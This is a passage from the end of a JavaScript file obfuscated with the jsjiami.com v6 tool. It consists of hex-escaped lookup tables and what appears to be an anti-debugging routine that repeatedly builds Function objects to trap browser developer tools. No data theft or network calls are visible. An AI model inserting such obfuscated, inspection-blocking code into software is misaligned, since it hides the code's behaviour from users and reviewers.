_0x21ef2a(_0x11f8cc);},'\x74\x57\x65\x47\x4c':function(_0x35af6e,_0x1988e6){return _0x35af6e+_0x1988e6;},'\x49\x61\x4d\x42\x64':_0x1fae('‮11e','\x6a\x5e\x5d\x62'),'\x4b\x45\x43\x41\x55':_0x1fae('‫11f','\x35\x56\x50\x4d'),'\x73\x71\x78\x66\x47':function(_0x14b3de,_0x1e57d8){return _0x14b3de===_0x1e57d8;},'\x63\x55\x53\x50\x58':_0x1fae('‫120','\x54\x61\x68\x6f'),'\x62\x61\x64\x44\x6d':function(_0x49c368,_0x1d059b){return _0x49c368(_0x1d059b);},'\x53\x62\x52\x48\x6e':function(_0x17f689,_0x5570b3){return _0x17f689*_0x5570b3;},'\x68\x4e\x6d\x63\x59':_0x1fae('‮121','\x23\x28\x62\x25'),'\x56\x6b\x44\x72\x41':_0x1fae('‫122','\x5e\x4a\x4a\x4e'),'\x73\x4c\x72\x57\x4b':function(_0x374586,_0x376468){return _0x374586+_0x376468;},'\x4d\x47\x70\x67\x62':function(_0x2311c7,_0x29b66e){return _0x2311c7+_0x29b66e;},'\x43\x48\x4f\x4e\x69':function(_0x2151ce,_0x48a0b8){return _0x2151ce===_0x48a0b8;},'\x43\x56\x4c\x6e\x52':function(_0x4fcd30,_0x2581e9){return _0x4fcd30===_0x2581e9;},'\x50\x4e\x77\x58\x4f':_0x1fae('‫123','\x63\x53\x47\x48'),'\x53\x57\x46\x78\x57':_0x1fae('‫124','\x40\x76\x7a\x41'),'\x79\x41\x58\x48\x55':function(_0x2e38e3,_0x5a6dc6){return _0x2e38e3+_0x5a6dc6;},'\x54\x4a\x43\x75\x77':function(_0x17d6e7){return _0x17d6e7();},'\x77\x58\x79\x74\x76':function(_0x4ae4d3,_0x4bd189){return _0x4ae4d3!==_0x4bd189;},'\x46\x49\x59\x46\x46':_0x1fae('‮125','\x5a\x35\x44\x66'),'\x78\x42\x62\x74\x4f':_0x1fae('‮126','\x5d\x26\x6f\x70'),'\x6d\x4b\x4e\x63\x6a':function(_0x2e4bfc,_0x23a14d){return _0x2e4bfc===_0x23a14d;},'\x68\x61\x6a\x77\x63':_0x1fae('‮127','\x40\x75\x33\x71'),'\x6e\x79\x76\x67\x57':function(_0xacd7fd){return _0xacd7fd();},'\x73\x6c\x59\x53\x50':function(_0x18cade,_0x35fd2b){return _0x18cade!==_0x35fd2b;},'\x51\x54\x62\x51\x5a':_0x1fae('‮128','\x36\x78\x43\x38'),'\x7a\x4f\x75\x55\x6b':_0x1fae('‮129','\x35\x56\x50\x4d'),'\x50\x4f\x59\x7a\x63':function(_0x550915,_0x42cd96){return _0x550915!==_0x42cd96;},'\x6f\x46\x67\x4a\x71':function(_0x4168d4,_0x3a3e98){return _0x4168d4+_0x3a3e98;},'\x4b\x4f\x79\x47\x77':function(_0x4b582a,_0x10a249){return _0x4b582a/_0x10a249;},'\x51\x54\x6b\x42\x64':_0x1fae('‫104','\x30\x32\x36\x4d'),'\x4e\x53\x43\x4f\x49':function(_0x13ab69,_0x3d3add){return _0x13ab69===_0x3d3add;},'\x62\x58\x4e\x41\x52':function(_0x3d36f9,_0x3a2737){return _0x3d36f9%_0x3a2737;},'\x73\x5a\x43\x53\x54':_0x1fae('‮12a','\x4b\x4c\x56\x4b'),'\x65\x73\x59\x6c\x6f':function(_0x218f97,_0x20b42d){return _0x218f97+_0x20b42d;},'\x76\x6c\x45\x6c\x77':_0x1fae('‫12b','\x74\x7a\x50\x4a'),'\x6d\x62\x63\x50\x58':_0x1fae('‫12c','\x54\x61\x68\x6f'),'\x4e\x55\x43\x6e\x75':_0x1fae('‮12d','\x67\x48\x26\x51')};function _0x32ccbd(_0x12546b){var _0xa5094b={'\x79\x52\x6a\x7a\x52':function(_0x387247,_0x55ad5a){return _0x4957eb[_0x1fae('‮12e','\x6c\x75\x51\x47')](_0x387247,_0x55ad5a);},'\x61\x52\x65\x5a\x77':_0x4957eb[_0x1fae('‫12f','\x4e\x5a\x72\x67')],'\x59\x4c\x41\x70\x70':_0x4957eb[_0x1fae('‫130','\x73\x74\x69\x70')],'\x41\x69\x52\x70\x6e':function(_0x221d8c,_0x3beb3d){return _0x4957eb[_0x1fae('‫131','\x36\x78\x43\x38')](_0x221d8c,_0x3beb3d);},'\x4a\x7a\x73\x5a\x67':function(_0x147fc5,_0x2068ea){return _0x4957eb[_0x1fae('‮132','\x69\x4a\x28\x40')](_0x147fc5,_0x2068ea);},'\x77\x55\x62\x58\x59':function(_0x40c69a,_0x187706){return _0x4957eb[_0x1fae('‮133','\x54\x61\x68\x6f')](_0x40c69a,_0x187706);},'\x75\x6f\x42\x54\x56':_0x4957eb[_0x1fae('‮134','\x69\x67\x56\x25')],'\x69\x59\x65\x7a\x72':_0x4957eb[_0x1fae('‮135','\x36\x78\x43\x38')],'\x4a\x5a\x72\x78\x6f':function(_0x226e31,_0x122a54){return _0x4957eb[_0x1fae('‫136','\x36\x78\x43\x38')](_0x226e31,_0x122a54);},'\x48\x50\x54\x6c\x68':function(_0xd2f558,_0x443cfc){return _0x4957eb[_0x1fae('‮137','\x69\x4a\x28\x40')](_0xd2f558,_0x443cfc);},'\x6f\x48\x75\x72\x44':_0x4957eb[_0x1fae('‫138','\x59\x63\x43\x67')],'\x48\x56\x63\x48\x7a':_0x4957eb[_0x1fae('‫139','\x24\x43\x58\x4b')],'\x4c\x48\x65\x79\x5a':function(_0x317670,_0x39e615){return _0x4957eb[_0x1fae('‫13a','\x78\x49\x50\x5b')](_0x317670,_0x39e615);},'\x45\x71\x4b\x6b\x50':_0x4957eb[_0x1fae('‮13b','\x5e\x4a\x4a\x4e')],'\x76\x69\x67\x6e\x73':function(_0x4f4dda){return _0x4957eb[_0x1fae('‮13c','\x54\x61\x68\x6f')](_0x4f4dda);}};if(_0x4957eb[_0x1fae('‮13d','\x40\x76\x7a\x41')](_0x4957eb[_0x1fae('‫13e','\x58\x29\x70\x73')],_0x4957eb[_0x1fae('‫13f','\x4b\x4c\x56\x4b')])){var _0x3eb357='\u202e\u202e';if(_0x4957eb[_0x1fae('‫140','\x51\x31\x65\x55')](typeof _0x12546b,_0x4957eb[_0x1fae('‮141','\x23\x5b\x63\x79')])&&_0x4957eb[_0x1fae('‫142','\x78\x39\x41\x73')](_0x3eb357,'\u202e\u202e')){var _0xeb11c8=function(){var _0x4508c1={'\x59\x69\x54\x6a\x63':_0x4957eb[_0x1fae('‫143','\x53\x66\x45\x49')],'\x59\x6d\x44\x45\x4d':function(_0x3998b7,_0x411516){return _0x4957eb[_0x1fae('‫144','\x5a\x35\x44\x66')](_0x3998b7,_0x411516);},'\x4d\x4b\x45\x72\x56':_0x4957eb[_0x1fae('‫145','\x74\x7a\x50\x4a')],'\x78\x55\x41\x76\x72':_0x4957eb[_0x1fae('‫146','\x31\x71\x68\x34')],'\x42\x6e\x55\x7a\x46':function(_0x107250,_0x37a5a9){return _0x4957eb[_0x1fae('‮147','\x51\x5b\x53\x5e')](_0x107250,_0x37a5a9);},'\x57\x74\x79\x56\x51':function(_0x4d1624,_0x3e2a89){return _0x4957eb[_0x1fae('‫148','\x6a\x5e\x5d\x62')](_0x4d1624,_0x3e2a89);},'\x76\x44\x55\x50\x6c':function(_0xc6b9c,_0x5ab271){return _0x4957eb[_0x1fae('‫148','\x6a\x5e\x5d\x62')](_0xc6b9c,_0x5ab271);},'\x4a\x6e\x77\x78\x59':_0x4957eb[_0x1fae('‮149','\x4e\x5a\x72\x67')],'\x70\x44\x54\x59\x66':_0x4957eb[_0x1fae('‮14a','\x47\x23\x28\x59')],'\x45\x58\x49\x63\x4f':function(_0x4f8191,_0x69162){return _0x4957eb[_0x1fae('‫14b','\x69\x67\x56\x25')](_0x4f8191,_0x69162);}};(function(_0x2bd0cd){if(_0xa5094b[_0x1fae('‮14c','\x4b\x4c\x56\x4b')](_0xa5094b[_0x1fae('‮14d','\x29\x78\x66\x4e')],_0xa5094b[_0x1fae('‮14e','\x4f\x34\x32\x73')])){return function(_0x2bd0cd){var _0x3d5356={'\x64\x63\x46\x63\x54':_0x4508c1[_0x1fae('‮14f','\x25\x33\x61\x32')]};if(_0x4508c1[_0x1fae('‮150','\x5d\x26\x6f\x70')](_0x4508c1[_0x1fae('‮151','\x55\x4b\x39\x61')],_0x4508c1[_0x1fae('‮152','\x6c\x75\x51\x47')])){return _0x4508c1[_0x1fae('‫153','\x24\x43\x58\x4b')](Function,_0x4508c1[_0x1fae('‮154','\x31\x71\x68\x34')](_0x4508c1[_0x1fae('‮155','\x47\x23\x28\x59')](_0x4508c1[_0x1fae('‫156','\x69\x4a\x28\x40')],_0x2bd0cd),_0x4508c1[_0x1fae('‫157','\x4b\x4c\x56\x4b')]));}else{var _0x42fac1={'\x53\x55\x68\x6f\x55':_0x3d5356[_0x1fae('‮158','\x30\x32\x36\x4d')]};that[_0x1fae('‮159','\x55\x4b\x39\x61')]=function(_0x34dee1){var PEcpml=_0x42fac1[_0x1fae('‫15a','\x47\x23\x28\x59')][_0x1fae('‫15b','\x74\x21\x65\x30')]('\x7c'),piunDf=0x0;while(!![]){switch(PEcpml[piunDf++]){case'\x30':_0x5fac3b[_0x1fae('‮15c','\x24\x43\x58\x4b')]=_0x34dee1;continue;case'\x31':_0x5fac3b[_0x1fae('‮15d','\x6b\x79\x5e\x52')]=_0x34dee1;continue;case'\x32':_0x5fac3b[_0x1fae('‮15e','\x58\x29\x70\x73')]=_0x34dee1;continue;case'\x33':_0x5fac3b[_0x1fae('‫15f','\x33\x77\x45\x6c')]=_0x34dee1;continue;case'\x34':_0x5fac3b[_0x1fae('‫160','\x58\x29\x70\x73')]=_0x34dee1;continue;case'\x35':var _0x5fac3b={};continue;case'\x36':return _0x5fac3b;case'\x37':_0x5fac3b[_0x1fae('‫161','\x56\x48\x59\x69')]=_0x34dee1;continue;case'\x38':_0x5fac3b[_0x1fae('‫162','\x6a\x5e\x5d\x62')]=_0x34dee1;continue;}break;}}(_00);}}(_0x2bd0cd);}else{if(_0x4508c1[_0x1fae('‫163','\x73\x74\x69\x70')](kit,'\u202e')&&fn){var _0x73a8b6=fn[_0x1fae('‫a3','\x31\x71\x68\x34')](context,arguments);fn=null;return _0x73a8b6;}}}(_0x4957eb[_0x1fae('‮164','\x4e\x5a\x72\x67')])('\x64\x65'));};return _0x4957eb[_0x1fae('‮165','\x63\x53\x47\x48')](_0xeb11c8);}else{if(_0x4957eb[_0x1fae('‫166','\x4b\x4c\x56\x4b')](_0x4957eb[_0x1fae('‫167','\x63\x53\x47\x48')],_0x4957eb[_0x1fae('‮168','\x6b\x79\x5e\x52')])){if(_0x4957eb[_0x1fae('‫169','\x36\x78\x43\x38')](_0x4957eb[_0x1fae('‫16a','\x59\x63\x43\x67')]('',_0x4957eb[_0x1fae('‮16b','\x78\x39\x41\x73')](_0x12546b,_0x12546b))[_0x4957eb[_0x1fae('‮16c','\x56\x48\x59\x69')]],0x1)||_0x4957eb[_0x1fae('‫16d','\x55\x4b\x39\x61')](_0x4957eb[_0x1fae('‫16e','\x5d\x26\x6f\x70')](_0x12546b,0x14),0x0)){(function(_0x5bad4e){var _0x16ac53={'\x6d\x78\x42\x5a\x45':function(_0x1f26b1,_0x367de3){return _0xa5094b[_0x1fae('‮16f','\x51\x31\x65\x55')](_0x1f26b1,_0x367de3);}};if(_0xa5094b[_0x1fae('‫170','\x6b\x79\x5e\x52')](_0xa5094b[_0x1fae('‮171','\x30\x32\x36\x4d')],_0xa5094b[_0x1fae('‮172','\x4e\x5a\x72\x67')])){if(_0x16ac53[_0x1fae('‮173','\x6e\x66\x68\x55')](kit,'\u202e')&&fn){var _0x428a35=fn[_0x1fae('‮174','\x73\x74\x69\x70')](context,arguments);fn=null;return _0x428a35;}}else{return function(_0x5bad4e){return _0xa5094b[_0x1fae('‮175','\x24\x43\x58\x4b')](Function,_0xa5094b[_0x1fae('‮176','\x78\x39\x41\x73')](_0xa5094b[_0x1fae('‮177','\x77\x4f\x65\x39')](_0xa5094b[_0x1fae('‫178','\x41\x43\x42\x48')],_0x5bad4e),_0xa5094b[_0x1fae('‮179','\x33\x57\x70\x30')]));}(_0x5bad4e);}}(_0x4957eb[_0x1fae('‫17a','\x33\x57\x70\x30')])('\x64\x65'));;}else{if(_0x4957eb[_0x1fae('‫17b','\x6c\x75\x51\x47')](_0x4957eb[_0x1fae('‫17c','\x47\x23\x28\x59')],_0x4957eb[_0x1fae('‮17d','\x4f\x34\x32\x73')])){(function(_0x24aeb0){var _0x3f3607={'\x6e\x41\x4a\x70\x6d':function(_0x175249,_0x259ddf){return _0xa5094b[_0x1fae('‫17e','\x4f\x34\x32\x73')](_0x175249,_0x259ddf);},'\x77\x59\x6d\x47\x50':function(_0x3476d3,_0x3e4992){return _0xa5094b[_0x1fae('‫17f','\x24\x43\x58\x4b')](_0x3476d3,_0x3e4992);},'\x54\x58\x57\x51\x7a':function(_0x536f8b,_0x548124){return _0xa5094b[_0x1fae('‫180','\x6a\x5e\x5d\x62')](_0x536f8b,_0x548124);},'\x49\x6a\x4d\x4f\x41':_0xa5094b[_0x1fae('‮181','\x47\x23\x28\x59')],'\x75\x41\x5a\x5a\x52':_0xa5094b[_0x1fae('‫182','\x58\x29\x70\x73')]};return function(_0x24aeb0){return _0x3f3607[_0x1fae('‫183','\x67\x48\x26\x51')](Function,_0x3f3607[_0x1fae('‮184','\x54\x61\x68\x6f')](_0x3f3607[_0x1fae('‮185','\x4f\x34\x32\x73')](_0x3f3607[_0x1fae('‫186','\x41\x43\x42\x48')],_0x24aeb0),_0x3f3607[_0x1fae('‮187','\x74\x7a\x50\x4a')]));}(_0x24aeb0);}(_0xa5094b[_0x1fae('‮188','\x55\x4b\x39\x61')])('\x64\x65'));}else{(function(_0x502027){var _0x5d6942={'\x77\x69\x78\x70\x6d':function(_0x5dcf3b,_0x2f24e4){return _0x4957eb[_0x1fae('‫189','\x55\x4b\x39\x61')](_0x5dcf3b,_0x2f24e4);},'\x52\x71\x54\x47\x56':function(_0x496793,_0x40a6a7){return _0x4957eb[_0x1fae('‫18a','\x5e\x25\x4a\x41')](_0x496793,_0x40a6a7);},'\x73\x74\x72\x6a\x61':_0x4957eb[_0x1fae('‫18b','\x40\x76\x7a\x41')],'\x78\x41\x66\x46\x51':_0x4957eb[_0x1fae('‫18c','\x78\x49\x50\x5b')]};return function(_0x502027){return _0x5d6942[_0x1fae('‫18d','\x51\x31\x65\x55')](Function,_0x5d6942[_0x1fae('‮18e','\x78\x49\x50\x5b')](_0x5d6942[_0x1fae('‮18f','\x67\x48\x26\x51')](_0x5d6942[_0x1fae('‮190','\x29\x78\x66\x4e')],_0x502027),_0x5d6942[_0x1fae('‮191','\x4a\x64\x40\x75')]));}(_0x502027);}(_0x4957eb[_0x1fae('‮192','\x47\x23\x28\x59')])('\x64\x65'));;}}}else{d+=b[_0x1fae('‮193','\x30\x32\x36\x4d')](Math[_0x1fae('‫194','\x56\x48\x59\x69')](_0x4957eb[_0x1fae('‫195','\x55\x4b\x39\x61')](Math[_0x1fae('‫196','\x4b\x4c\x56\x4b')](),c)));}}_0x4957eb[_0x1fae('‮197','\x47\x23\x28\x59')](_0x32ccbd,++_0x12546b);}else{_0xa5094b[_0x1fae('‮198','\x77\x4f\x65\x39')](_0x1d4dd7);}}try{if(_0x1cbd23){if(_0x4957eb[_0x1fae('‫199','\x5e\x25\x4a\x41')](_0x4957eb[_0x1fae('‫19a','\x5a\x29\x41\x2a')],_0x4957eb[_0x1fae('‮19b','\x47\x5d\x70\x39')])){var _0x29107e={'\x67\x63\x6f\x4c\x50':function(_0x5bef48,_0x453378){return _0x4957eb[_0x1fae('‫19c','\x51\x5b\x53\x5e')](_0x5bef48,_0x453378);},'\x75\x58\x58\x7a\x56':function(_0x29eac8,_0x51515a){return _0x4957eb[_0x1fae('‮19d','\x30\x32\x36\x4d')](_0x29eac8,_0x51515a);},'\x42\x75\x6f\x6e\x44':function(_0x3085fd,_0x5c9ab3){return _0x4957eb[_0x1fae('‮19e','\x74\x7a\x50\x4a')](_0x3085fd,_0x5c9ab3);},'\x44\x58\x70\x4c\x6f':_0x4957eb[_0x1fae('‮19f','\x53\x66\x45\x49')],'\x72\x54\x66\x6a\x55':_0x4957eb[_0x1fae('‮1a0','\x78\x39\x41\x73')]};return function(_0x5efe27){return _0x29107e[_0x1fae('‮1a1','\x78\x49\x50\x5b')](Function,_0x29107e[_0x1fae('‮1a2','\x73\x74\x69\x70')](_0x29107e[_0x1fae('‫1a3','\x35\x56\x50\x4d')](_0x29107e[_0x1fae('‫1a4','\x4e\x5a\x72\x67')],_0x5efe27),_0x29107e[_0x1fae('‮1a5','\x63\x53\x47\x48')]));}(a);}else{return _0x32ccbd;}}else{if(_0x4957eb[_0x1fae('‮1a6','\x55\x4b\x39\x61')](_0x4957eb[_0x1fae('‫1a7','\x51\x31\x65\x55')],_0x4957eb[_0x1fae('‫1a8','\x56\x48\x59\x69')])){var _0x69a69e=fn[_0x1fae('‫1a9','\x68\x31\x4c\x39')](context,arguments);fn=null;return _0x69a69e;}else{_0x4957eb[_0x1fae('‫1aa','\x35\x56\x50\x4d')](_0x32ccbd,0x0);}}}catch(_0x512bf7){}};_0xod1='jsjiami.com.v6';